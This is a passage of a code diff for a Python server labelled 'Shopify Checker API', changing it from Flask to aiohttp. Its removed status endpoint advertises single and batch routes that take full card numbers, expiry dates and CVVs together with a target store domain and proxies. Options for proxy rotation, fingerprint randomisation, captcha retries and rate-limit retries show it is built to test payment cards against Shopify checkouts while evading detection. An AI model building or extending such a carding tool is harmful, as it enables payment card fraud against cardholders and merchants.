+                 "fp=%s net_retry=%s rl_retry=%s connect_retry=%s pool_file=%s",
+                 PORT, GLOBAL_MAX_CONCUR, PER_USER_CONCUR, ROTATE, FORCE_CLOSE,
+                 FINGERPRINT_MODE, NET_RETRIES, RL_RETRIES, CONNECT_RETRY, len(PROXY_POOL))
 
-@app.route("/status")
-def status():
-    return jsonify({
-        "status": "online",
-        "global_max": GLOBAL_MAX_CONCUR,
-        "per_user": PER_USER_CONCUR,
-        "active_users": len(_user_sems),
-        "proxy_pool_optional": len(PROXY_POOL),
-        "cached_sites": len(_SITE_CACHE),
-        "fingerprint_mode": FINGERPRINT_MODE,
-        "force_close": FORCE_CLOSE,
-        "ports": [PORT] + _extra_ports(),
-        "endpoints": {
-            "single": "GET /shopify?card=CARD|MM|YYYY|CVV&site=DOMAIN&proxy=host:port",
-            "batch": "POST /batch {site,cards[],proxies[]}",
-            "stats": "GET /stats",
-        },
-    })
+    async def _on_clean(app_):
+        _prune_cooldowns()
 
-
-@app.route("/stats")
-def stats():
-    with _stats_lock:
-        s = dict(STATS)
-    s["uptime_sec"] = round(time.time() - s.get("started", time.time()), 1)
-    return jsonify(s)
-
-
-# ==============================================================================
-#  [FIX-5] MULTI PORT SERVER
-# ==============================================================================
-
-def _extra_ports():
-    raw = _EXTRA_PORTS_RAW or ""
-    out = []
-    for piece in raw.split(","):
-        piece = piece.strip()
-        if not piece:
-            continue
-        try:
-            pnum = int(piece)
-        except ValueError:
-            continue
-        if pnum != PORT and pnum not in out:
-            out.append(pnum)
-    return out
-
-
-def _serve_on(port):
-    try:
-        from waitress import serve
-        serve(app, host="0.0.0.0", port=port, threads=THREADS)
-    except ImportError:
-        app.run(host="0.0.0.0", port=port, debug=False, threaded=True, use_reloader=False)
+    app.on_startup.append(_on_start)
+    app.on_cleanup.append(_on_clean)
+    return app
 
 
 def main():
-    global PORT, _EXTRA_PORTS_RAW, THREADS, MAX_RETRIES, CAPTCHA_RETRY, FINGERPRINT_MODE
-
-    ap = argparse.ArgumentParser(description="Shopify Checker API")
+    global PORT, HOST
+    ap = argparse.ArgumentParser(description="Shopify Checker API (single, unlimited)")
     ap.add_argument("--port", type=int, default=PORT)
-    ap.add_argument("--extra-ports", type=str, default=_EXTRA_PORTS_RAW,
-                    help="comma separated extra ports, e.g. 9092 or 9092,9093")
-    ap.add_argument("--threads", type=int, default=THREADS)
-    ap.add_argument("--retries", type=int, default=MAX_RETRIES)
-    ap.add_argument("--captcha-retry", type=int, default=CAPTCHA_RETRY)
-    ap.add_argument("--fingerprint", choices=["fixed", "random"], default=FINGERPRINT_MODE)
+    ap.add_argument("--host", type=str, default=HOST)
     args = ap.parse_args()
-
     PORT = args.port
-    _EXTRA_PORTS_RAW = args.extra_ports
-    THREADS = args.threads
-    MAX_RETRIES = args.retries
-    CAPTCHA_RETRY = args.captcha_retry
-    FINGERPRINT_MODE = args.fingerprint
+    HOST = args.host
 
-    get_loop()
-
-    extras = _extra_ports()
-    print(f"[ENGINE] main_port={PORT} extra_ports={extras or 'none'} "
-          f"global={GLOBAL_MAX_CONCUR} per_user={PER_USER_CONCUR} "
-          f"fp={FINGERPRINT_MODE} force_close={FORCE_CLOSE} "
-          f"retries={MAX_RETRIES} captcha_retry={CAPTCHA_RETRY} pool={len(PROXY_POOL)}")
-
-    for pnum in extras:
-        threading.Thread(target=_serve_on, args=(pnum,), daemon=True).start()
-        print(f"[ENGINE] extra listener on 0.0.0.0:{pnum}")
-
-    _serve_on(PORT)
+    app = build_app()
+    web.run_app(app, host=HOST, port=PORT, backlog=8192,
+                keepalive_timeout=75, access_log=None, print=None)
 
 
 if __name__ == "__main__":
